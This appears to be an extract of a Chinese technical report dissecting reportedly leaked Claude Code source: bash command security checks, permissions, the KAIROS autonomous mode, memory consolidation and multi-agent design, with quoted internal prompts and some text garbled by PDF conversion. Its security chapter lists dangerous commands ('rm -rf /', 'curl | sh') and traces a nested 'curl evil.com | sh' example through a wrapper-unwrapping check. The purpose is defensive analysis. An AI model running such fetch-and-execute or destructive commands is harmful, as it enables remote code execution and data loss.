+bashSecurity.ts 实现的安全检查涵盖以下类别：
+命令注入防护：
+1. Shell元字符检测（;、&&、||、|、` ``）
+2. 命令替换检测（$()、` ... `）
+3. 进程替换检测（<()、>()）
+4. 重定向检测（>、>>、<）
+危险命令拦截：
+5. 文件系统破坏（rm -rf /、chmod -R 777等）
+6. 网络操作（curl | sh、wget -O- | bash等）
+7. 包管理器危险操作
+8. Git危险操作（git push --force、git reset --hard）
+Zsh特定防御：
+9. zmodload — 动态模块加载
+10. ztcp — Zsh TCP连接
+11. zpy — Zsh Python集成
+12. 其他Zsh内置危险命令
+环境变量劫持：
+13. BINARY_HIJACK_VARS 列表检测（PATH、LD_PRELOAD、DYLD_LIBRARY_PATH等）
+14. 环境变量覆盖模式检测
+命令包装解包： 
+15-25. 
+迭代固定点算法处理嵌套包装（env、sudo、bash 
+-c、sh
+-c、nohup、nice、timeout等）
+9.2 迭代固定点算法
+BashTool的安全检查核心是一个"迭代固定点"算法。它的工作原理：
+    : "env VAR=x sudo bash -c 'curl evil.com | sh'"  1 : -    "env VAR=x"         →    -   :
+"sudo bash -c 'curl evil.com | sh'"  2 : -    "sudo"         →    -   : "bash -c 'curl evil.com |
+sh'"  3 : -    "bash -c"       →        -   : "curl evil.com | sh"  4 : -   "curl evil.com | sh"
+       -    :    shell   →     5 : -   4      →           这个算法的关键在于"固定点"——当连续两轮解析结果不再变化时，算法收敛。这保证了无论嵌套多少
+层包装，最终都能到达实际执行的命令。
+
+--- Page 27 ---
+Claude Code 0331 系统报告
+第9章 · BashTool安全深度分析
+—  27  —
+公众号：手工川
+2026-04-01
+9.3 沙箱适配器
+utils/sandbox/sandbox-adapter.ts（997行）实现了更高层级的沙箱隔离。它在BashTool之上提供：
+• 文件系统隔离（限制可访问的目录范围）
+• 网络隔离（限制可访问的域名）
+• 资源限制（CPU时间、内存使用）
+• 进程隔离（限制子进程创建）
+
+--- Page 28 ---
+Claude Code 0331 系统报告
+第9章 · BashTool安全深度分析
+—  28  —
+公众号：手工川
+2026-04-01
+第10章 · 权限模型
+10.1 三级决策树
+每个工具操作经过以下决策流程：
+┌──────────────┐ │        │ └──────┬───────┘ ▼ ┌──────────────┐ │   Allow   │────    ──▶     └──────┬───────┘ │     ▼ ┌──────────────┐ │   Deny   │────    ──▶      └──────┬───────┘ │     ▼
+┌──────────────┐ │        │──── Allow ──▶      │ (Ask) │──── Deny ──▶      └──────────────┘
+10.2 四层规则来源
+权限规则按以下优先级合并：
+1. Settings配置（settings.json）：用户的全局权限偏好
+2. CLI参数：命令行传入的权限覆盖
+3. Command参数：特定命令的权限上下文
+4. Session状态：会话中动态积累的权限决策
+10.3 拒绝追踪机制
+当用户拒绝某个工具的权限请求时，系统会追踪拒绝计数：
+• 连续拒绝3次 → 触发"策略回退提示"
+• 累计拒绝20次 → 触发更强的回退信号
+"策略回退"意味着让Claude换一种方式完成任务，而不是继续请求被拒绝的工具。这避免了"AI反复骚扰
+用户请求权限"的糟糕体验。
+10.4 AI分类器辅助
+TRANSCRIPT_CLASSIFIER 
+特性标志门控了一个独立的AI分类器。当启用时，对话transcript会被发送给分
+类器，分类器判断操作是否安全：
+• 分类器确认安全 → 自动允许
+• 分类器不确定 → 回退到用户确认（故障关闭）
+• 分类器判断不安全 → 自动拒绝
+10.5 Hook系统
+PreToolUse 和 PostToolUse 钩子提供了扩展权限模型的能力：
+
+--- Page 29 ---
+Claude Code 0331 系统报告
+第10章 · 权限模型
+—  29  —
+公众号：手工川
+2026-04-01
+• PreToolUse：在工具执行前触发。可以修改输入参数、拒绝执行、或添加额外验证。
+• PostToolUse：在工具执行后触发。可以检查输出、记录审计日志、触发后续操作。
+企业用户可以通过Hook实现自定义的安全策略——例如，禁止修改特定目录的文件，或要求特定操作必
+须经过审批流程。
+
+--- Page 30 ---
+Claude Code 0331 系统报告
+第10章 · 权限模型
+—  30  —
+公众号：手工川
+2026-04-01
+第四部分：KAIROS与自主Agent系统
+
+--- Page 31 ---
+Claude Code 0331 系统报告
+第四部分：KAIROS与自主Agent系统
+—  31  —
+公众号：手工川
+2026-04-01
+第11章 · KAIROS：自主助手模式全解
+11.1 KAIROS在代码库中的分布
+KAIROS是Claude Code中最引人注目的隐藏系统之一。通过对泄露源码的全面检索，我们发现feature('K
+AIROS')在57个文件中出现了158次，遍布代码库的各个核心模块。这一分布密度表明KAIROS不是一个实
+验性附加功能，而是深度嵌入Claude Code架构的核心系统。
+KAIROS的设计哲学体现在其名称本身——在希腊语中，Kairos（καιρός）意为"恰当的时机"或"关键时刻"
+，与Chronos（线性时间）形成对比。这暗示了KAIROS系统的核心理念：AI不是被动等待用户指令，而
+是在"恰当的时机"主动采取行动。
+11.2 六个KAIROS子标志矩阵
+KAIROS采用分层特性标志设计，一个主标志加五个子标志，构成了精细的功能控制矩阵：
+标志名
+控制功能
+门控逻辑
+关键文件
+KAIROS
+主开关：自主Agent模式
+编译时消除
+tools.ts, prompts.ts, main.tsx
+KAIROS_BRIEF
+Brief工具：状态感知消息
+`KAIROS \
+\
+KAIROS_CHANNELS
+外部渠道集成（Slack/Discord
+/SMS）
+`KAIROS \
+\
+KAIROS_PUSH_NOTIFICAT
+ION
+系统推送通知
+`KAIROS \
+\
+KAIROS_GITHUB_WEBHOOK
+S
+GitHub PR订阅与Webhook
+独立标志
+tools/SubscribePRTool/
+KAIROS_DREAM
+自主记忆巩固（Dream模式）
+独立标志
+tasks/DreamTask/,
+services/autoDream/
+值得注意的是门控逻辑的设计：大多数子标志采用OR门控（KAIROS || KAIROS_XXX），这意味着这些功
+能既可以作为完整KAIROS模式的一部分启用，也可以作为独立功能独立激活。这种设计为Anthropic提
+供了极大的灰度发布灵活性——他们可以先向部分用户推送Brief工具或推送通知功能，而不必启用完整
+的自主Agent模式。
+11.3 assistant/模块：会话历史管理
+assistant/sessionHistory.ts实现了KAIROS的会话历史管理，为长期运行的自主Agent提供了会话恢复
+能力：
+export type HistoryPage = { events: SDKMessage[] //            firstId: string | null //
+    ID        hasMore: boolean //           }
+
+--- Page 32 ---
+Claude Code 0331 系统报告
+第11章 · KAIROS：自主助手模式全解
+—  32  —
+公众号：手工川
+2026-04-01
+该模块通过OAuth令牌和组织UUID进行认证，支持基于游标的分页查询，每页加载100个事件（HISTORY
+_PAGE_SIZE = 100）。核心API包括：
+• createHistoryAuthCtx(sessionId) — 创建认证上下文
+• fetchLatestEvents(ctx, limit) — 获取最新事件
+• fetchOlderEvents(ctx, beforeId, limit) — 获取更早事件
+这套分页API的设计表明KAIROS的会话可能持续数小时甚至数天，需要高效的历史回溯机制。
+11.4 系统提示：自主Agent的完整指令
+当KAIROS或PROACTIVE模式激活且isProactiveActive()返回true时，系统提示中会注入一段关键文本（c
+onstants/prompts.ts，472-879行）：
+You are an autonomous agent. Use the available tools to do useful work.
+这行简洁的开场白之后，跟随着详细的自主工作指南（864-879行）：
+# Autonomous work You are running autonomously. You will receive `<tick>` prompts that keep you
+alive between turns — just treat them as "you're awake, what now?" The time in each `<tick>` is
+the user's current local time. Use it to judge the time of day — timestamps from external tools
+(Slack, GitHub, etc.) may be in a different timezone. Multiple ticks may be batched into a
+single message. This is normal — just process the latest one. Never echo or repeat tick content
+in your response.
+提示中还包含了关于资源管理的精妙指导：
+## Pacing Use the Sleep tool to control how long you wait between actions. Sleep longer when
+waiting for slow processes, shorter when actively iterating. Each wake-up costs an API call, but
+the prompt cache expires after 5 minutes of inactivity — balance accordingly. **If you have
+nothing useful to do on a tick, you MUST call Sleep.** Never respond with only a status message
+like "still waiting" or "nothing to do" — that wastes a turn and burns tokens for no reason.
+这段提示揭示了KAIROS的运营成本模型：每次wake-up消耗一次API调用，但prompt
+cache在5分钟不活动后过期。KAIROS需要在"保持活跃"和"节省成本"之间找到平衡点。
+首次唤醒时的行为也有明确规定：
+## First wake-up On your very first tick in a new session, greet the user briefly and ask what
+they'd like to work on. Do not start exploring the codebase or making changes unprompted — wait
+for direction.
+这表明即使是自主Agent，Anthropic也设计了"征求许可"的初始行为模式，避免Agent在用户不知情的情
+况下修改代码库。
+11.5 <tick>心跳机制
+<tick>是KAIROS最核心的运行时机制，实现于cli/print.ts（1835-1856行）：
+const tickContent = `<${TICK_TAG}>${new Date().toLocaleTimeString()}</${TICK_TAG}>` enqueue({
+mode: 'prompt' as const, value: tickContent, uuid: randomUUID(), priority: 'later', isMeta:
+true, })
+tick的关键特征：
+• 触发条件：当isProactiveActive()为true且未暂停时，通过setTimeout(..., 0)循环触发
+• 内容格式：<tick>HH:MM:SS AM/PM</tick>，包含用户当前本地时间
+• 优先级：设为'later'，允许与其他消息批量处理
+
+--- Page 33 ---
+Claude Code 0331 系统报告
+第11章 · KAIROS：自主助手模式全解
+—  33  —
+公众号：手工川
+2026-04-01
+• 元数据标记：isMeta: true表明这是系统元数据而非用户输入
+tick标签在constants/xml.ts中定义为常量TICK_TAG = 'tick'。UI层面，components/messages/UserText
+Message.tsx会提取tick标签以进行特殊渲染，而utils/sessionStorage.ts通过识别tick来判断自主模式
+的prompt。
+从架构角度看，tick机制本质上是一个"轮询式唤醒"系统。与传统的事件驱动架构不同，KAIROS采用了"
+周期性检查"的模式——这可能看起来效率较低，但考虑到LLM的无状态特性（每次调用都需要完整上下
+文），tick机制是一种务实的设计选择。
+11.6 Proactive模式：运行时激活路径
+KAIROS的激活状态通过bootstrap/state.ts中的全局状态管理：
+export function getKairosActive(): boolean { return STATE.kairosActive } export function
+setKairosActive(value: boolean): void { STATE.kairosActive = value }
+这个状态被广泛用于代码库中的条件判断：
+•
+禁用AutoDream（KAIROS使用自己的磁盘技能Dream替代）：services/autoDream/autoDream.ts:96
+• 控制自主Agent模式的激活
+• 门控各种依赖KAIROS的行为
+isProactiveActive()函数是tick机制和自主提示的最终守门人。它不仅检查KAIROS标志，还检查运行时
+的Proactive状态，允许在非KAIROS构建中通过Proactive路径激活类似行为。
+11.7 KAIROS专属工具链
+三个工具仅在KAIROS相关标志启用时才被编译和加载（tools.ts，42-52行）：
+SendUserFileTool（KAIROS独占）：
+const SendUserFileTool = feature('KAIROS') ?
+require('./tools/SendUserFileTool/SendUserFileTool.js').SendUserFileTool : null
+允许自主Agent向用户发送文件，例如生成的报告、分析结果或代码产物。这对于长时间运行的自主任
+务至关重要——Agent可能在用户离线时完成了工作，需要主动推送结果。
+PushNotificationTool（KAIROS或独立启用）：
+const PushNotificationTool = feature('KAIROS') || feature('KAIROS_PUSH_NOTIFICATION') ?
+require('./tools/PushNotificationTool/PushNotificationTool.js') .PushNotificationTool : null
+系统推送通知能力，让Agent能够在重要事件发生时通知用户——例如长时间构建完成、监控到的异常
+、或需要人类决策的关键节点。
+SubscribePRTool（GitHub Webhooks独立标志）：
+const SubscribePRTool = feature('KAIROS_GITHUB_WEBHOOKS') ?
+require('./tools/SubscribePRTool/SubscribePRTool.js').SubscribePRTool : null
+PR订阅工具使Agent能够监控GitHub 
+Pull
+Request的状态变化，实现自动化的代码审查流程。这指向了KAIROS作为"值班开发者"的产品愿景。
+11.8 SleepTool：自主Agent的节奏控制器
+
+--- Page 34 ---
+Claude Code 0331 系统报告
+第11章 · KAIROS：自主助手模式全解
+—  34  —
+公众号：手工川
+2026-04-01
+SleepTool（tools/SleepTool/prompt.ts）是KAIROS运行节奏的核心控制器：
+export const SLEEP_TOOL_PROMPT = `Wait for a specified duration. The user can interrupt the
+sleep at any time. Use this when the user tells you to sleep or rest, when you have nothing to
+do, or when you're waiting for something. You may receive <tick> prompts — these are periodic
+check-ins. Look for useful work to do before sleeping. You can call this concurrently with other
+tools — it won't interfere with them. Prefer this over Bash(sleep ...) — it doesn't hold a shell
+process. Each wake-up costs an API call, but the prompt cache expires after 5 minutes of
+inactivity — balance accordingly.`
+关键设计特点：
+• 非阻塞：不占用Shell进程，与Bash(sleep ...)形成对比
+• 可中断：用户可以随时中断Sleep
+• 可并发：不干扰其他并发工具调用
+• Cache感知：明确提醒prompt cache在5分钟后过期，帮助Agent在成本和响应性之间做出平衡
+11.9 BriefTool：状态感知的智能通信
+BriefTool（tools/BriefTool/BriefTool.ts）为KAIROS提供了区分主动通知和被动响应的能力：
+const inputSchema = z.strictObject({ message: z.string() .describe('The message for the user.
+Supports markdown formatting.'), attachments: z.array(z.string()).optional() .describe('Optional
+file paths to attach.'), status: z.enum(['normal', 'proactive']) .describe("Use 'proactive' when
+surfacing something user hasn't asked for..."), })
+status: 'proactive'标记让UI层能够以不同方式呈现Agent主动发起的消息（如使用不同的颜色或通知
+级别），这对于用户体验至关重要——用户需要快速区分"我问的问题的答案"和"Agent觉得我应该知道
+的事情"。
+11.10 Channel Notification：外部消息集成
+services/mcp/channelNotification.ts实现了KAIROS与外部通信渠道（Discord、Slack、SMS等）的集成
+：
+export const ChannelMessageNotificationSchema = z.object({ method:
+z.literal('notifications/claude/channel'), params: z.object({ content: z.string(), meta:
+z.record(z.string(), z.string()).optional(), }), })
+消息流程：
+1. MCP服务器发送channel notification
+2. 消息被包裹在<channel>标签中并入队
+3. SleepTool通过hasCommandsInQueue()检测到新消息，在1秒内唤醒Agent
+4. Agent看到消息来源，决定是通过渠道工具回复、发送SendUserMessage，还是两者兼顾
+准入条件相当严格：
+• 需要KAIROS或KAIROS_CHANNELS特性标志
+• 需要GrowthBook tengu_harbor运行时标志
+• 必须使用claude.ai OAuth认证（API key用户被阻止）
+• Teams/Enterprise用户需要管理员明确启用channelsEnabled: true
+这一设计表明Anthropic对Channel功能保持高度谨慎——一个能接收外部消息并自动响应的AI
+Agent，其安全性和滥用风险需要仔细控制。
+
+--- Page 35 ---
+Claude Code 0331 系统报告
+第11章 · KAIROS：自主助手模式全解
+—  35  —
+公众号：手工川
+2026-04-01
+11.11 KAIROS与Bridge的集成
+KAIROS的自主Agent天然需要长时间运行，这使其与Bridge系统（第15章详述）形成了紧密的协作关系
+。通过Bridge，KAIROS Agent可以：
+• 在远程服务器上持续运行，不依赖用户的终端会话
+• 通过WebSocket与用户的桌面客户端保持连接
+• 在用户断线后继续工作，重连后同步状态
+• 通过PushNotification和SendUserFile主动推送结果
+claude assistant [sessionId]子命令提供了连接到正在运行的KAIROS会话的入口，允许用户随时接入
+查看Agent的工作状态。
+
+--- Page 36 ---
+Claude Code 0331 系统报告
+第11章 · KAIROS：自主助手模式全解
+—  36  —
+公众号：手工川
+2026-04-01
+第12章 · DreamTask与自动记忆巩固
+12.1 Dream任务的生命周期
+tasks/DreamTask/DreamTask.ts定义了Dream任务的完整状态模型：
+export type DreamPhase = 'starting' | 'updating' export type DreamTaskState = TaskStateBase & {
+type: 'dream' phase: DreamPhase sessionsReviewing: number //          filesTouched: string[] //
+         turns: DreamTurn[] //        abortController?: AbortController priorMtime: number //
+        }
+Dream任务的每个"turn"包含文本内容和工具使用次数：
+export type DreamTurn = { text: string toolUseCount: number }
+UI层面，Dream任务最多保留30个turns（MAX_TURNS = 30），超出后滚动丢弃最早的记录。
+12.2 AutoDream服务：触发条件
+services/autoDream/autoDream.ts实现了Dream的自动触发逻辑。触发需要通过三道"门"：
+时间门：距离上次记忆巩固至少24小时
+// hours since lastConsolidatedAt >= minHours (default: 24)
+会话门：自上次巩固以来至少有5个新会话
+// session count with mtime > lastConsolidatedAt >= minSessions (default: 5)
+锁定门：没有其他进程正在执行巩固
+配置通过GrowthBook特性标志tengu_onyx_plover动态控制，允许Anthropic远程调整触发阈值。
+有一个重要的互斥逻辑：
+function isGateOpen(): boolean { if (getKairosActive()) return false // KAIROS      Dream if
+(getIsRemoteMode()) return false if (!isAutoMemoryEnabled()) return false return
+isAutoDreamEnabled() }
+当KAIROS处于活跃状态时，AutoDream被禁用——因为KAIROS有自己的记忆巩固机制（通过KAIROS_DREA
+M标志控制），避免两套系统冲突。
+扫描节流设置为10分钟（SESSION_SCAN_INTERVAL_MS 
+= 
+10 
+60
+1000），当时间门已通过但会话门尚未满足时，避免频繁扫描文件系统。
+12.3 只读子Agent的权限约束
+Dream使用runForkedAgent()在隔离环境中执行，严格限制其工具使用：
+• Bash白名单仅包含只读命令：ls, find, grep, cat, stat, wc, head, tail
+• 可以编辑的仅限记忆目录下的文件
+
+--- Page 37 ---
+Claude Code 0331 系统报告
+第12章 · DreamTask与自动记忆巩固
+—  37  —
+公众号：手工川
+2026-04-01
+• 跳过transcript持久化（skipTranscript: true），因为Dream本身是元数据操作
+• 共享父级的prompt cache以提高效率
+12.4 四阶段巩固周期
+services/autoDream/consolidationPrompt.ts定义了Dream的四阶段执行流程：
+阶段1 — 定位（Orient） 列出记忆目录结构，阅读索引文件，回顾现有主题。
+阶段2 
+— 
+采集近期信号（Gather 
+Recent 
+Signal）
+扫描日志，发现已漂移的事实，在transcript中搜索特定上下文。
+阶段3 — 巩固（Consolidate） 按照系统提示的格式规范，写入或更新记忆文件。
+阶段4 
+— 
+修剪与索引（Prune 
+and 
+Index）
+更新索引文件（保持在25KB、每行约150字符以内），清除过期条目。
+12.5 Dream输出
+巩固结果写入到用户可配置的记忆目录中，默认为：
+~/.claude/projects/<sanitized-git-root>/memory/
+记忆文件使用结构化的Markdown格式，包含frontmatter元数据（类型、范围、时间戳）。
+12.6 与人类睡眠记忆巩固的类比
+DreamTask的命名显然借鉴了神经科学中的"睡眠记忆巩固"理论——人类在睡眠期间（尤其是慢波睡眠
+阶段）会将短期记忆转化为长期记忆，进行信息整理和无关信息的清除。
+Claude Code的Dream系统精确地模拟了这一过程：
+• 触发条件类似于"睡眠压力"——活动越多（5个会话），时间间隔越长（24小时），巩固的需求越
+迫切
+• 只读约束类似于睡眠中大脑与外界的断连——Dream Agent不能执行修改性操作，只能整理和记录
+• 四阶段周期类似于睡眠周期——定位、采集、巩固、修剪，从宏观扫描到微观更新
+• 互斥逻辑——KAIROS活跃时Dream被禁用，正如人类在清醒状态下不会进入慢波睡眠
+这种命名不仅仅是隐喻——它反映了Anthropic团队对AI记忆管理的深层思考，以及从认知科学中汲取灵
+感的设计哲学。
+
+--- Page 38 ---
+Claude Code 0331 系统报告
+第12章 · DreamTask与自动记忆巩固
+—  38  —
+公众号：手工川
+2026-04-01
+第13章 · 多Agent系统：三条技术路线
+13.1 Coordinator模式：Leader-Worker架构
+coordinator/coordinatorMode.ts实现了经典的Leader-Worker多Agent架构。Coordinator作为"主管"，接
+收用户任务后将其分解为子任务，分配给Worker执行。
+系统提示（111-240行）定义了Coordinator的核心职责：
+• 帮助用户达成目标
+• 指导Worker进行研究、实现和验证
+• 综合整理结果
+• 在不需要工具调用时直接回答
+Worker能力矩阵：
+• 标准工具（Bash、Edit、Read等）
+• MCP服务器提供的工具
+• 通过Skill工具使用技能（如/commit、/verify）
+• 可选的共享暂存目录（Scratchpad）用于跨Worker的持久化存储
+并发模型体现了Anthropic对并行安全性的深入思考：
+• 只读任务：可以自由并行
+• 写入密集型任务：按文件集串行化
+• 验证可以与不同区域的实现重叠执行
+"不委托理解"原则是Coordinator设计中的关键约束——Coordinator不应将"理解代码结构"这样的元认知
+任务委托给Worker，而应自己综合Worker的研究结果来建立理解。这避免了多层委托导致的信息衰减
+。
+Worker结果格式使用结构化XML：
+<task-notification> <task-id>{agentId}</task-id> <status>completed|failed|killed</status>
+<summary>{         }</summary> <result>{Agent       }</result> <usage>
+<total_tokens>N</total_tokens> <tool_uses>N</tool_uses> <duration_ms>N</duration_ms> </usage>
+</task-notification>
+usage信息的包含表明Coordinator需要进行成本感知的任务分配——如果某个Worker消耗了过多Token，
+Coordinator可以决定调整策略。
+13.2 Swarm系统：对等协作
+utils/swarm/实现了一个完全不同的多Agent范式——对等协作的Swarm系统。
+核心常量（constants.ts）：
+
+--- Page 39 ---
+Claude Code 0331 系统报告
+第13章 · 多Agent系统：三条技术路线
+—  39  —
+公众号：手工川
+2026-04-01
+export const TEAM_LEAD_NAME = 'team-lead' export const SWARM_SESSION_NAME = 'claude-swarm'
+export const SWARM_VIEW_WINDOW_NAME = 'swarm-view' export const TMUX_COMMAND = 'tmux' export
+const HIDDEN_SESSION_NAME = 'claude-hidden'
+Swarm与Coordinator的关键区别：
+• 无中心节点：Team Lead只是命名约定，不是特权角色
+• tmux可视化：每个Agent运行在自己的tmux窗口中，用户可以实时观察所有Agent的活动
+• 权限同步（permissionSync.ts）：Leader和Teammate之间的权限桥接，确保安全策略的一致性
+• 进程级隔离：每个Agent是独立的进程，拥有自己的上下文和状态
+In-Process 
+Runner（inProcessRunner.ts）是Swarm的轻量级变体，使用AsyncLocalStorage进行上下文
+隔离而非进程隔离：
+• 包裹runAgent()用于进程内Teammate执行
+• runWithTeammateContext()实现基于AsyncLocalStorage的上下文隔离
+• 支持进度追踪和AppState更新
+• 完成时向Leader发送Idle通知
+• 支持Plan Mode审批流程
+13.3 InProcessTeammate：进程内队友
+tasks/InProcessTeammateTask/types.ts定义了进程内Teammate的完整状态模型：
+Teammate身份：
+export type TeammateIdentity = { agentId: string //    "researcher@my-team" agentName: string //
+   "researcher" teamName: string color?: string //        planModeRequired: boolean
+parentSessionId: string // Leader   ID }
+状态模型中最引人注目的设计是50消息的UI上限：
+export const TEAMMATE_MESSAGES_UI_CAP = 50
+这一限制的来源有一个生动的工程故事——代码注释中记录了一个名为"whale session 9a990de8"的事件
+：在一次测试中，2分钟内生成了292个Agent，导致内存使用量飙升至36.8GB以上。50消息上限是对这
+次"鲸鱼会话"的直接回应，通过限制AppState中每个Teammate保留的消息数量来防止内存爆炸。
+状态字段的丰富程度反映了Teammate生命周期的复杂性：
+• awaitingPlanApproval — 等待Plan Mode审批
+• permissionMode — 权限模式
+• isIdle / shutdownRequested — 空闲和关闭状态
+• onIdleCallbacks — 空闲时的回调队列
+• pendingUserMessages — 待处理的用户消息队列
+• lastReportedToolCount / lastReportedTokenCount — 进度报告状态
+13.4 三条路线的适用场景对比
+维度
+Coordinator
+Swarm/tmux
+InProcessTeammate
+架构
+中心化Leader-Worker
+去中心化对等
+进程内轻量级
+隔离级别
+进程级（可选Worktree）
+进程级（tmux）
+线程级（AsyncLocalStorage）
+
+--- Page 40 ---
+Claude Code 0331 系统报告
+第13章 · 多Agent系统：三条技术路线
+—  40  —
+公众号：手工川
+2026-04-01
+维度
+Coordinator
+Swarm/tmux
+InProcessTeammate
+并发模型
+Coordinator调度
+自组织
+Leader分配
+适用场景
+复杂项目、多阶段任务
+探索性研究、并行实验
+快速子任务、低开销
+最大Agent数
+受系统资源限制
+tmux窗口数限制
+受内存限制（50消息/Agent）
+通信方式
+结构化XML通知
+tmux IPC
+Mailbox + AppState
+成本追踪
+usage XML字段
+独立计量
+lastReportedTokenCount
+用户可见性
+任务状态通知
+tmux实时可视化
+UI进度条
+13.5 AgentTool的Worktree隔离
+AgentTool支持Git Worktree级别的隔离，为每个Worker Agent创建独立的工作目录副本：
+• Worker在隔离的worktree中工作，可以自由修改文件而不影响主工作目录
+• 完成后，Worker的变更可以被合并回主分支
+• 如果Worker的工作被放弃，worktree可以被无副作用地清理
+这种设计特别适合以下场景：
+• 并行尝试多种实现方案
+• 在不干扰当前工作的情况下进行实验性重构
+• 代码审查中的自动修复建议（在独立分支上生成修复，等待人类审批后合并）
+Worktree隔离与Coordinator的并发模型配合，实现了"写入密集型任务按文件集串行化"的目标——不同
+Worktree本质上就是不同的文件集。
+
+--- Page 41 ---
+Claude Code 0331 系统报告
+第13章 · 多Agent系统：三条技术路线
+—  41  —
+公众号：手工川
+2026-04-01
+第五部分：记忆与知识系统
+
+--- Page 42 ---
+Claude Code 0331 系统报告
+第五部分：记忆与知识系统
+—  42  —
+公众号：手工川
+2026-04-01
+第14章 · 四层记忆架构
+Claude Code实现了一个四层记忆系统，从短期会话记忆到长期团队知识，形成了一个完整的AI认知记忆
+层次结构。
+14.1 Session Memory：会话内周期性提取
+services/SessionMemory/sessionMemory.ts实现了会话级别的记忆提取，维护一个Markdown文件记录
+会话中的关键信息。
+触发阈值（sessionMemoryUtils.ts）：
+• minimumMessageTokensToInit: 10,000 tokens — 初始阈值，上下文达到此规模才开始提取
+• minimumTokensBetweenUpdate: 5,000 tokens — 两次提取之间的最小上下文增长
+• toolCallsBetweenUpdates: 3 — 两次提取之间的最小工具调用次数
+触发决策逻辑：
+export function shouldExtractMemory(messages: Message[]): boolean { //   1       if
+(!isSessionMemoryInitialized()) { if (!hasMetInitializationThreshold(currentTokenCount)) return
+false markSessionMemoryInitialized() } //   2       const hasMetTokenThreshold =
+hasMetUpdateThreshold(currentTokenCount) const hasMetToolCallThreshold =
+toolCallsSinceLastUpdate >= getToolCallsBetweenUpdates() const hasToolCallsInLastTurn =
+hasToolCallsInLastAssistantTurn(messages) return (hasMetTokenThreshold &&
+hasMetToolCallThreshold) || (hasMetTokenThreshold && !hasToolCallsInLastTurn) }
+这个双条件设计非常精妙：
+• Token增长 且 工具调用足够多 → 触发（活跃的工具使用阶段）
+• Token增长 且 最后一轮没有工具调用 → 触发（对话转折点，适合总结）
+Forked Agent模式： 记忆提取通过runForkedAgent()执行，创建一个隔离的子Agent：
+• 共享父级的prompt cache以提高效率
+• 通过createMemoryFileCanUseTool()限制编辑范围仅限记忆文件
+• querySource标记为'session_memory'用于分析追踪
+• 提取超时：EXTRACTION_WAIT_TIMEOUT_MS = 15,000（15秒）
+• 过期阈值：EXTRACTION_STALE_THRESHOLD_MS = 60,000（1分钟后视为过期）
+特性门控：
+• GrowthBook标志：tengu_session_memory（缓存读取，非阻塞）
+• 远程配置：tengu_sm_config提供动态阈值调整
+• 通过memoized的initSessionMemoryConfigIfNeeded()实现懒初始化
+14.2 Memdir：MEMORY.md入口与结构化目录
+
+--- Page 43 ---
+Claude Code 0331 系统报告
+第14章 · 四层记忆架构
+—  43  —
+公众号：手工川
+2026-04-01
+memdir/模块实现了持久化的记忆目录系统。
+目录定位（paths.ts）：
+//        // 1. CLAUDE_COWORK_MEMORY_PATH_OVERRIDE      // 2. settings.json   autoMemoryDirectory // 3. ~/.claude/projects/<sanitized-git-root>/memory/
+MEMORY.md约束（memdir.ts）：
+• 入口文件名：MEMORY.md
+• 最大行数：200行（超出时截断并附加警告）
+• 最大字节数：25,000（防止超长行导致的索引问题）
+• 截断提示：> WARNING: MEMORY.md is X lines (limit: 200). Only part of it was loaded.
+记忆类型分类法（memoryTypes.ts）：
+export const MEMORY_TYPES = [ 'user', //                     'feedback', //              'project', //           Bug       'reference', //               ] as const
+每种类型都有明确的作用域定义：
+• user — 始终私有，不同步到团队
+• feedback — 默认私有，可选择共享
+• project — 偏向团队共享
+• reference — 通常为团队级别
+记忆新鲜度追踪（memoryAge.ts）：
+export function memoryAgeDays(mtimeMs: number): number { return Math.max(0,
+Math.floor((Date.now() - mtimeMs) / 86_400_000)) }
+超过1天的记忆会附加新鲜度警告，提醒Claude记忆可能已过期。这解决了"AI幻觉记忆"的问题——Clau
+de不会盲目信任陈旧的记忆，而是以适当的置信度使用它们。
+记忆指导Section中包含了一个特别值得注意的"不应保存"清单：
+• 不保存代码模式（代码本身就是最好的文档）
+• 不保存Git历史（可以随时查询）
+• 不保存架构（应该从CLAUDE.md获取）
+以及"信任召回"验证指南：在使用记忆进行推荐之前，先验证记忆内容是否仍然准确。
+14.3 Magic Docs：AI自动维护的文档
+services/MagicDocs/magicDocs.ts实现了一个独特的概念——AI自动维护的文档。
+检测模式：
+const MAGIC_DOC_HEADER_PATTERN = /^#\s*MAGIC\s+DOC:\s*(.+)$/im const ITALICS_PATTERN =
+/^[_*](.+?)[_*]\s*$/m
+当Claude读取一个文件时，如果文件头部包含# MAGIC DOC: [标题]标记，该文件就会被注册为Magic
+Doc。之后，Claude会使用专门的Sonnet模型Agent定期更新这些文件。
+更新流程：
+1. 通过registerFileReadListener()在文件被读取时注册
+2. 克隆FileStateCache隔离操作
+3. 重新读取文件内容，检测header和instructions
+
+--- Page 44 ---
+Claude Code 0331 系统报告
+第14章 · 四层记忆架构
+—  44  —
+公众号：手工川
+2026-04-01
+4. 如果header丢失，取消跟踪
+5. 构建更新prompt，包含检测到的标题和指令
+6. 使用Sonnet模型和仅FileEdit工具的Agent执行更新
+Agent约束：
+• 模型：强制使用'sonnet'
+• 工具：仅允许FILE_EDIT_TOOL_NAME
+• 文件范围：通过canUseTool检查精确匹配文件路径
+Magic Docs的设计理念是让AI维护一类"活的文档"——例如变更日志、依赖版本追踪、或API端点清单，
+这些文档需要随代码变化而更新，但人类开发者经常忘记维护。
+14.4 Team Memory Sync：团队知识同步
+services/teamMemorySync/实现了跨团队成员的记忆同步。
+同步语义：
+export type SyncState = { lastKnownChecksum: string | null serverChecksums: Map<string, string>
+//   key sha256   serverMaxEntries: number | null // 413          }
+• Pull：服务端优先（per-key覆盖本地）
+• Push：增量上传（仅哈希不同的key）
+• 删除：不传播（本地删除不等于服务端删除）
+API契约：
+GET /api/claude_code/team_memory?repo={owner/repo} → TeamMemoryData   entryChecksums  PUT
+/api/claude_code/team_memory?repo={owner/repo} →      upsert   大小限制：
+• 单条目上限：250,000字节
+• PUT请求体上限：200,000字节（超出时分批发送）
+• 最大重试次数：3次（冲突重试2次）
+14.5 秘密扫描：上传前的安全屏障
+teamMemorySync/secretScanner.ts实现了35+条基于gitleaks规则的秘密扫描，在记忆上传到团队服务器
+之前进行安全检查。
+覆盖的秘密类型包括：
+• 云提供商：AWS、GCP、Azure、DigitalOcean
+• AI API：Anthropic、OpenAI、HuggingFace
+• 版本控制：GitHub、GitLab
+• 通信：Slack、Twilio、SendGrid
+• 开发工具：npm、PyPI、Databricks、Terraform
+• 可观测性：Grafana、Sentry
+• 支付：Stripe、Shopify
+• 加密：私钥
+
+--- Page 45 ---
+Claude Code 0331 系统报告
+第14章 · 四层记忆架构
+—  45  —
+公众号：手工川
+2026-04-01
+扫描流程：
+export function scanForSecrets(content: string): SecretMatch[] { const matches: SecretMatch[] =
